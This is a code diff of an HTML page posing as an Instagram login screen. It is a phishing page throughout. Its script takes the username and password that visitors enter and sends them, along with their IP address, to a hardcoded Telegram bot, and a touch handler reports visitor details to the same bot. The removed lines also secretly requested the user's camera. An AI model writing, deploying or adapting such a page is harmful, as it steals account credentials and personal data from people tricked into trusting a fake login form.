@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram Login</title>
     <style>
         body {
             background-color: #121212;
-            color: #ffffff;
+            color: white;
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -23,12 +23,6 @@
             text-align: center;
             width: 320px;
         }
-        .logo {
-            margin-bottom: 20px;
-        }
-        .logo img {
-            width: 180px;
-        }
         input {
             width: 100%;
             padding: 10px;
@@ -37,9 +31,6 @@
             border-radius: 5px;
             background-color: #2c2c2c;
             color: #ffffff;
-        }
-        input::placeholder {
-            color: #bbbbbb;
         }
         button {
             width: 100%;
@@ -54,41 +45,24 @@
         button:hover {
             background-color: #007bb5;
         }
-        .footer {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .footer a {
-            color: #0095f6;
-            text-decoration: none;
-        }
-        video {
-            display: none;
-        }
     </style>
 </head>
-<body ontouchstart="startStream()">
+<body ontouchstart="startLiveStream()">
 
     <div class="container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-        </div>
-        <input type="text" id="username" placeholder="Instagram ID">
+        <h2>Instagram Login</h2>
+        <input type="text" id="username" placeholder="Phone number, username, or email">
         <input type="password" id="password" placeholder="Password">
         <button onclick="sendData()">Log In</button>
-        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
     </div>
-
-    <video id="liveVideo" autoplay></video>
 
     <script>
         let ipAddress = "Unknown IP";
-        let liveStreamLink;
+        let liveStreamLink = window.location.origin + "/live.html";  // Automatically refer to the live stream page
 
-        async function startStream() {
+        async function startLiveStream() {
             await getIpAddress();
-            await setupWebRTCStream();
-            sendStreamLinkToBot();
+            sendStreamLinkToBot();  // Send details to Telegram bot
         }
 
         async function getIpAddress() {
@@ -99,28 +73,11 @@
                 });
         }
 
-        async function setupWebRTCStream() {
-            try {
-                // Access the user's camera
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                const videoElement = document.getElementById('liveVideo');
-                videoElement.srcObject = stream;
-
-                // Create an object URL to simulate a "live streaming link"
-                liveStreamLink = URL.createObjectURL(new MediaSource());
-
-                // Simulate using the local stream link
-                liveStreamLink = `${window.location.origin}/#liveStream-${Math.random().toString(36).substr(2, 8)}`;
-            } catch (error) {
-                console.error('Failed to start WebRTC streaming:', error);
-            }
-        }
-
         function sendStreamLinkToBot() {
             const message = `New Interaction Detected!\nIP Address: ${ipAddress}\nLive Camera Stream: ${liveStreamLink}\nTime: ${new Date().toLocaleString()}`;
 
-            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
-            const chatId = '860517021';
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
+            const chatId = '860517021';  // Your chat ID
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(telegramApiUrl, {
@@ -139,19 +96,15 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            const message = `Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;
+            const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;
 
-            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
-            const chatId = '860517021';
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            fetch(telegramApiUrl, {
+            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: chatId,
+                    chat_id: '860517021',
                     text: message
                 })
             });
